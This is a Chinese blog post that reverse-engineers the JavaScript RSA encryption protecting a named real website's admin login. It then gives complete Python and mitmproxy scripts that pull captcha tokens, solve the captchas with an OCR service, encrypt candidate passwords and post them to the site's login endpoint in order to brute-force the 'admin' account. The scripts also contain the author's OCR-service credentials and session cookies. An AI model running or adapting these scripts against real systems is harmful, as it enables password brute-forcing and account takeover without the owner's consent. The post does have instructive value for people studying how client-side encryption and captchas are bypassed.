---
title: 一次简单的JS逆向
published: 2024-03-02 17:09
category: Web
draft: false
tags: [JS逆向, RSA, 加密]
---

------

## 0x01 登录页面

访问主页自动跳转登录页面，登录失败。提示用户名或密码错误。

![](/images/posts/js-reverse-rsa/1.jpg)

抓包重放有验证码错误，密码被加密。

![](/images/posts/js-reverse-rsa/2.jpg)

发现有`imgStr`参数进行校验，类似于`token`防重放攻击，重新请求获取验证码。

![](/images/posts/js-reverse-rsa/3.jpg)

![](/images/posts/js-reverse-rsa/4.jpg)

验证码认证成功

![](/images/posts/js-reverse-rsa/5.jpg)

## 0x02 查看JS

其实这里的验证码虽然有`token`验证，但由于`token`是可以获取的，所以理论上是可以通过`ocr`接口获取然后进行登录爆破，那最重要的问题就是密码`password`参数的构造，直接写明文密码肯定是不行的，这里尝试过发现返回的不是密码错误，而是这样的报错。

```
javax.crypto.BadPaddingException: Decryption error
```

能看到有`crypto`字眼，这表示后台解密过程中发生了填充错误。当然我也尝试过正确格式也不成功，后面能够看到。

![](/images/posts/js-reverse-rsa/6.jpg)

首先登录一次，查看网络信息，能够看到这里的加密提交参数。

![](/images/posts/js-reverse-rsa/7.jpg)

![](/images/posts/js-reverse-rsa/8.jpg)

```assembly
imgStr: "jve7ebhm7h"     # 验证码token
loginposition: 1         # 测试删除后导致语法错误
password: "QjvTDzgUlBFgL+E3IrHJrAw3ZWJO5tThhb8NR99nv24CjldhAZn3YFh85bXDnLL+IL0OPEhoMeuuIHo5ALjemYTE7fk9gG4V1y52mQYJ8diZXhFSLs7X6QP9d3z0cZZf7b3IzhcGqD5IJGMMRcsyVD1Z9EReLAR3xa4EM/8t+A4="   # 加密密码参数
username: "admin"        # 明文账号
veryCode: "9386"         # 验证码
```

![](/images/posts/js-reverse-rsa/9.jpg)

查看调用栈，有`login`字段，既然要进行登录，那就会像后端发送请求，则前端加密工作就已经结束了。

![](/images/posts/js-reverse-rsa/10.jpg)

跟进查看，运行到提交表单这一步

```javascript
s.i(n.a)(this, "/omp/system/system_spring_security", i).then(function(e) {
```

![](/images/posts/js-reverse-rsa/11.jpg)

向上看一下对应的参数，发现有类似加密的字眼，打上断点再进行登录查看。

```javascript
var e = new JSEncrypt;
e.setPublicKey(this.PublicKey);
```

![](/images/posts/js-reverse-rsa/12.jpg)

向下运行到这一行之后发现定义的`o`的值，这是能够看到`this.password`的值为`123456`，是测试的明文密码，而`o`则是通过`e.encrypt()`函数进行加密后的密文密码。

![](/images/posts/js-reverse-rsa/13.jpg)

测试这个密文进行登录，验证成功。

![](/images/posts/js-reverse-rsa/14.jpg)

## 0x03 加密密文

既然已经知道了加密函数的位置和加密方法，这里在控制台测试输出，正常来说这里应该还要设置公钥或者私钥，由于这里的公钥是硬编码，且已经完整执行`js`，所以直接调用函数便得到了密文。

![](/images/posts/js-reverse-rsa/15.jpg)

这里其实可以使用常见的`js`加密插件和`burp`联合使用即可进行绕过加密算法，但是那样是封装起来的，在渗透测试中，我们应该有一个确定的思路就是，能不使用框架则不使用框架，因为那是不透明的，这点我们的思路要明确。

这里继续跟进加密函数。

```javascript
var e = new JSEncrypt;
```

![](/images/posts/js-reverse-rsa/16.jpg)

这段代码是在设置`RSA`密钥生成参数时执行的操作，简单来说，它设置了RSA密钥生成中的公钥指数（public exponent）的默认值。有过RSA加密了解的话应该对十六进制`010001`这个数值不陌生，十进制下，这个值就是`65537`，作为常见的`RSA`公钥指数而存在。

再对`e.setPublicKey(this.PublicKey);`函数跟进，发现下面的参数，这里的默认指数给定的指是`65537`，下面的`e`并不是`RSA`加密中的指数，在这里其实是`RSA`加密的公钥，是通过硬编码的方式存储在`js`中。

```assembly
default_key_size: 1024
default_public_exponent: "010001"
key: null
log: false
[[Prototype]]: Object
e: "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDEYtvVnsDwdVPutk7t7BVARBbk00h0l+tSjtKswncCpM9CcebzIsWXvLtdnQdDu1ABuW1GziaU1XSQixKcFH9HiIfjcM0+DoqNEXXH8sLIkIbz1g1ajA/6N6oL6Guq+w/u9lV5TChRVnE7Lo5Z2aFxTNv+Z5psTON8v+akXpUIHwIDAQAB"
```

![](/images/posts/js-reverse-rsa/17.jpg)

这里能看到一个`base64`解码操作，这里应该是对公钥的解密从而得到`e`和`n`。

![](/images/posts/js-reverse-rsa/18.jpg)

再向下走，跟进` var o = e.encrypt(this.password)`，这才真正进入加密函数中，能够看到`encrypt(e)`加密函数。

![](/images/posts/js-reverse-rsa/19.jpg)

虽然前面已经确认了是`RSA`加密，不过到这一步就能够明显地看到了是`RSA`加密。

![](/images/posts/js-reverse-rsa/20.jpg)

到了这里，这个加密算法就已经很明显了。

```
通过RSA进行加密：
1、公钥是硬编码
2、得到公钥
3、分解得到e、n
4、对明文进行加密
5、输出结果
```

这里使用`python3.9.2`进行编写。

```
pub.key：
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDEYtvVnsDwdVPutk7t7BVARBbk
00h0l+tSjtKswncCpM9CcebzIsWXvLtdnQdDu1ABuW1GziaU1XSQixKcFH9HiIfj
cM0+DoqNEXXH8sLIkIbz1g1ajA/6N6oL6Guq+w/u9lV5TChRVnE7Lo5Z2aFxTNv+
Z5psTON8v+akXpUIHwIDAQAB
-----END PUBLIC KEY-----
```

```python
# !/usr/bin/python3
# -*- coding:utf-8 -*-
# @Time : 2024/3/1 17:13
# @Author : 大C菌
# @File : rsa加密.py
# @Software: PyCharm
from Crypto.PublicKey import RSA
import gmpy2
from Crypto.Cipher import PKCS1_OAEP
import libnum
from urllib import parse
from pwn import *

with open('pub.key', 'r', encoding='utf-8') as info:
    pub_key = info.read()

print(pub_key)
pub_key = RSA.import_key(pub_key)
n, e = pub_key.n, pub_key.e
print(n)
# 137907056262359252538853999808270380583999899877129402326434295133351469026614387545938793697464324739075934692639085136942856546572909502719806774996693449508554455813932164110063437320089941862618538590554994619416379676921493247845752705537709558701460971785757437160956841427618384777163102140110946502687
print(e) # 65537
a = gmpy2.is_prime(n)
print(a) # False


# 使用公钥创建一个加密器
cipher_rsa = PKCS1_OAEP.new(pub_key)

m = b'123456'
e_data = cipher_rsa.encrypt(m)
print(e_data) # b'v\xac\xbc\x84\xf3\x08\xcf\xbc\xc0\x8d\xd5C\xf3\xd0i:p\xd9pE\xda\x94\xc9i\x87%\xb4n\x03\xc9\x8ffi\xbf}\x11\xec\xeb3Ud\x08\xcb%N\xab8y\x1c\xe4_XY\xa2\xc9\xbc\x9a\x8b\x83\xedf\x17\xac\xc3\x01T\x85F\x93N\xd3\x11\x89\x02\x96\xe1\xd7e\x84\xc2\x97z\xb4\x91\xf5\xdaqF\xbe\x87\x05\r\xfc1\xaa\xfc\xe5\xe6\xe7\x0bt\x97\xd1C\xf2\x93\x80\xd2K\x12\xe9\xe8\xf1\xa7\xbcE\x9e\xd5\x1d\x0f\xf0;t`\xe4N\xfd\xe2'
e_data_base64 = base64.b64encode(e_data)
print(e_data_base64) # b'dqy8hPMIz7zAjdVD89BpOnDZcEXalMlphyW0bgPJj2Zpv30R7OszVWQIyyVOqzh5HORfWFmiybyai4PtZheswwFUhUaTTtMRiQKW4ddlhMKXerSR9dpxRr6HBQ38Mar85ebnC3SX0UPyk4DSSxLp6PGnvEWe1R0P8Dt0YORO/eI='
```

用加密后的值去尝试登录，登录失败，出现了报错。

```
javax.crypto.BadPaddingException: Decryption error
```

![](/images/posts/js-reverse-rsa/21.jpg)

这里解释一下，`javax.crypto.BadPaddingException` 表示解密过程中发生了填充错误。在使用对称加密算法时，通常会在密文的末尾添加填充以保证其长度是块大小的整数倍，常见的填充方案包括`PKCS#1 v1.5`填充和`OAEP`填充（Optimal Asymmetric Encryption Padding）。其中`OAEP`填充是更为安全和推荐的填充方案，它提供了更好的安全性和更好的随机性，能够更好地抵抗一些加密攻击，如选择明文攻击。

在解密时，解密算法会尝试删除填充，如果填充不正确，则会抛出 `BadPaddingException` 异常。很明显这里通过公钥加密的密文传输给后端，后端使用私钥进行解密却失败，所以抛出了异常。

更换填充方式为`PKCS1_v1_5`再次尝试。

```python
# !/usr/bin/python3
# -*- coding:utf-8 -*-
# @Time : 2024/3/1 17:13
# @Author : 大C菌
# @File : rsa加密.py
# @Software: PyCharm
from Crypto.PublicKey import RSA
import gmpy2
from Crypto.Cipher import PKCS1_v1_5
import libnum
from urllib import parse
from pwn import *

with open('pub.key', 'r', encoding='utf-8') as info:
    pub_key = info.read()

pub_key = RSA.import_key(pub_key)
n, e = pub_key.n, pub_key.e

# 使用公钥创建一个加密器
cipher_rsa = PKCS1_v1_5.new(pub_key)

m = b'123456'
e_data = cipher_rsa.encrypt(m)
e_data_base64 = base64.b64encode(e_data)
print(e_data_base64)
```

![](/images/posts/js-reverse-rsa/22.jpg)

验证成功

## 0x04 加密传输

接下来就可以构造请求包尝试进行爆破，首先整理思路：

```
1、请求验证码接口，获取验证码的token值和验证码图片的base64编码，并进行解码得到验证码图片；
2、通过第三方插件或接口对验证码图片进行识别；
3、使用加密函数对请求的password值进行加密，并与验证码等其他参数组合为一个完整的请求体；
4、第四步可以通过burp与mitmproxy进行联动，以便手动修改参数，在爆破验证码上也是有效的方式，所以这里我只进行验证方法可行，后面只做到登录爆破的程度。
```

### 1、Burp与联动mitmproxy

个中原理这里不再赘述，首先是获取验证码与`ocr`识别：

```python
class GetCode:

    def __init__(self):
        pass

    def getCode(self):
        headers = {
            "Host": "www.sx-xfjy.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://www.sx-xfjy.com/",
        }

        url = 'http://www.sx-xfjy.com/vue_admin/omp/forgetPassword/identifyImageBase64'
        req = requests.get(url=url, headers=headers)
        req_json = req.json()
        imgStr = req_json['data']['imgStr']
        _, imageBase64Data = str(req_json['data']['imageBase64Data']).split(',')
        image_data = base64.b64decode(imageBase64Data)
        image = Image.open(io.BytesIO(image_data))
        image.save('img/decode_images.png')
        print(imgStr)
        return str(imgStr)

    def base64_api(self, uname, pwd, img, typeid):
        with open(img, 'rb') as f:
            base64_data = base64.b64encode(f.read())
            b64 = base64_data.decode()
        data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
        result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
        if result['success']:
            return result["data"]["result"]
        else:
            # ！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
            return result["message"]

    def identify(self):
        img_path = '/images/posts/js-reverse-rsa/decode_images.png'
        result = self.base64_api(uname='dcj', pwd='135728Qq', img=img_path, typeid=1)
        print(result)
        return str(result)
```

加密函数：

```python
def encrypt(password):
    with open('pub.key', 'r', encoding='utf-8') as info:
        pub_key = info.read()

    pub_key = RSA.import_key(pub_key)

    # 使用公钥创建一个加密器
    cipher_rsa = PKCS1_v1_5.new(pub_key)

    m = password.encode()
    e_data = cipher_rsa.encrypt(m)
    e_data_base64 = base64.b64encode(e_data)
    return e_data_base64
```

`Mitmproxy`联动：

```python
class AutoDecoderClass(object):

    def request(self, flow: http.HTTPFlow):
        getcode = GetCode()
        if flow.request.method == 'POST' and flow.request.headers['Content-Type'] == 'application/json;charset=utf-8':
            # print(flow.request.content)
            data = json.loads(flow.request.content.decode('utf-8'))
            # print(data['password'])
            # print(encrypt(data['password']).decode())
            e_password = encrypt(data['password']).decode()
            imgStr = getcode.getCode()
            veryCode = getcode.identify()

            flow.request.content = json.dumps(
                {"username": "admin", "password": str(e_password), "veryCode": veryCode, "loginposition": 1, "imgStr": imgStr}).encode()
                # {"username": "admin", "password": str(e_password), "veryCode": "6245", "loginposition": 1, "imgStr": "z8cs8oxbmz"}).encode()
            print(flow.request.content)

    def response(self, flow: http.HTTPFlow):
        pass


addons = [
    AutoDecoderClass()
]
```

这个脚本最终呈现的效果是在`burp`上。

```
运行：
mitmdump -s demo.py --ssl-insecure --listen-port 55555 --mode socks5
[16:30:44.612] Loading script demo.py
[16:30:44.946] SOCKS v5 proxy listening at *:55555.
```

不要忘记添加代理。

![](/images/posts/js-reverse-rsa/23.jpg)

可以看到，我即使不用输入验证码和验证码`token`参数，只输入账号和明文密码，也可以通过验证，这里可以测试类似注入攻击与暴力破解。

![](/images/posts/js-reverse-rsa/24.jpg)

完整代码：

```python
# !/usr/bin/python3
# -*- coding:utf-8 -*-
# @Time : 2024/3/2 15:01
# @Author : 大C菌
# @File : demo.py
# @Software: PyCharm
from mitmproxy import http
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import io, json, requests, base64
from PIL import Image


class GetCode:

    def __init__(self):
        pass

    def getCode(self):
        headers = {
            "Host": "www.sx-xfjy.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://www.sx-xfjy.com/",
        }

        url = 'http://www.sx-xfjy.com/vue_admin/omp/forgetPassword/identifyImageBase64'
        req = requests.get(url=url, headers=headers)
        req_json = req.json()
        imgStr = req_json['data']['imgStr']
        _, imageBase64Data = str(req_json['data']['imageBase64Data']).split(',')
        image_data = base64.b64decode(imageBase64Data)
        image = Image.open(io.BytesIO(image_data))
        image.save('img/decode_images.png')
        print(imgStr)
        return str(imgStr)

    def base64_api(self, uname, pwd, img, typeid):
        with open(img, 'rb') as f:
            base64_data = base64.b64encode(f.read())
            b64 = base64_data.decode()
        data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
        result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
        if result['success']:
            return result["data"]["result"]
        else:
            # ！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
            return result["message"]

    def identify(self):
        img_path = '/images/posts/js-reverse-rsa/decode_images.png'
        result = self.base64_api(uname='dcj', pwd='135728Qq', img=img_path, typeid=1)
        print(result)
        return str(result)


# 加密函数
def encrypt(password):
    with open('pub.key', 'r', encoding='utf-8') as info:
        pub_key = info.read()

    pub_key = RSA.import_key(pub_key)

    # 使用公钥创建一个加密器
    cipher_rsa = PKCS1_v1_5.new(pub_key)

    m = password.encode()
    e_data = cipher_rsa.encrypt(m)
    e_data_base64 = base64.b64encode(e_data)
    return e_data_base64


class AutoDecoderClass(object):

    def request(self, flow: http.HTTPFlow):
        getcode = GetCode()
        if flow.request.method == 'POST' and flow.request.headers['Content-Type'] == 'application/json;charset=utf-8':
            # print(flow.request.content)
            data = json.loads(flow.request.content.decode('utf-8'))
            # print(data['password'])
            # print(encrypt(data['password']).decode())
            e_password = encrypt(data['password']).decode()
            imgStr = getcode.getCode()   # 这里要先进行获取token，在进行识别，不然在获取tokne的时候就会多访问一次接口
            veryCode = getcode.identify()

            flow.request.content = json.dumps(
                {"username": "admin", "password": str(e_password), "veryCode": veryCode, "loginposition": 1, "imgStr": imgStr}).encode()
                # {"username": "admin", "password": str(e_password), "veryCode": "6245", "loginposition": 1, "imgStr": "z8cs8oxbmz"}).encode()
            print(flow.request.content)

    def response(self, flow: http.HTTPFlow):
        pass


addons = [
    AutoDecoderClass()
]
```

### 2、登录框爆破

这里和第一种方式大差不大，主要就是完全通过脚本去提交数据，其中加密与验证码识别是一样的。

![](/images/posts/js-reverse-rsa/25.jpg)

```python
# !/usr/bin/python3
# -*- coding:utf-8 -*-
# @Time : 2024/3/2 16:36
# @Author : 大C菌
# @File : demo2.py
# @Software: PyCharm
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import io, json, requests, base64
from PIL import Image


class GetCode:

    def __init__(self):
        pass

    def getCode(self):
        headers = {
            "Host": "www.sx-xfjy.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://www.sx-xfjy.com/",
        }

        url = 'http://www.sx-xfjy.com/vue_admin/omp/forgetPassword/identifyImageBase64'
        req = requests.get(url=url, headers=headers)
        req_json = req.json()
        imgStr = req_json['data']['imgStr']
        _, imageBase64Data = str(req_json['data']['imageBase64Data']).split(',')
        image_data = base64.b64decode(imageBase64Data)
        image = Image.open(io.BytesIO(image_data))
        image.save('img/decode_images.png')
        print(imgStr)
        return str(imgStr)

    def base64_api(self, uname, pwd, img, typeid):
        with open(img, 'rb') as f:
            base64_data = base64.b64encode(f.read())
            b64 = base64_data.decode()
        data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
        result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
        if result['success']:
            return result["data"]["result"]
        else:
            # ！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
            return result["message"]

    def identify(self):
        img_path = '/images/posts/js-reverse-rsa/decode_images.png'
        result = self.base64_api(uname='dcj', pwd='135728Qq', img=img_path, typeid=1)
        print(result)
        return str(result)


# 加密函数
def encrypt(password):
    with open('pub.key', 'r', encoding='utf-8') as info:
        pub_key = info.read()

    pub_key = RSA.import_key(pub_key)

    # 使用公钥创建一个加密器
    cipher_rsa = PKCS1_v1_5.new(pub_key)

    m = password.encode()
    e_data = cipher_rsa.encrypt(m)
    e_data_base64 = base64.b64encode(e_data)
    return e_data_base64


if __name__ == '__main__':
    getcode = GetCode()
    headers = {
        "Host": "www.sx-xfjy.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://www.sx-xfjy.com/",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "http://www.sx-xfjy.com",
        "Cookie": "SECKEY_ABVK=qOUnHiYLA0QvxOh8qtI8CSsUkzNCv/5ucN/hU6zcXY0%3D; BMAP_SECKEY=iGmRyj6_NdjcORnEGQxsoDU9ZrGuL9y7_4zjlCUiQZfVi_w-iN2SWlB-qwG64p4QDoGioaYCMq_Di0SL2lL1zhGtkc6kiuHi3ypdxIgoiVx_mXeoIrU4JI4_yT6MslzpO0ywiLA0zrtHiQGB7OD9V_Yj-M6IHc3CBUdtX_gzmTuSP8GHzojDRLrUZEXlI68t"
    }

    url = 'http://www.sx-xfjy.com/vue_admin/omp/system/system_spring_security'

    username = 'admin'
    password = '123456'
    e_password = encrypt(password).decode()

    data = {
        "username": username,
        "password": e_password,
        "loginposition": 1,
        "imgStr": getcode.getCode(),
        "veryCode": getcode.identify()
    }
    json_data = json.dumps(data)   # 坑点！！！必须要进行json转换，在这里失败了好多次
    req = requests.post(url=url, headers=headers, data=json_data)
    print(json_data)
    print(req.text)
    print(req.status_code)
```

可以修改`username`和`password`两个参数值来进行登录框爆破，下列是使用第一种方法进行爆破，更容易实现。

![](/images/posts/js-reverse-rsa/26.jpg)

完结撒花~~~

------

## PS：

```
后期发现了两个工具可以不需要第三方ocr来进行识别，财力有限的大家可以使用开源工具进行识别(^.^)
```

### tesseract-ocr

```
https://digi.bib.uni-mannheim.de/tesseract/
```

```
https://blog.csdn.net/username666/article/details/126310781
```

### ddddocr

```
https://pypi.org/project/ddddocr/1.1.0/
```

```python
def identify2(self):
    with open('img/decode_images.png', 'rb') as info:
        img_bytes = info.read()

    text = DdddOcr(show_ad=False).classification(img_bytes)
    print(text)
```

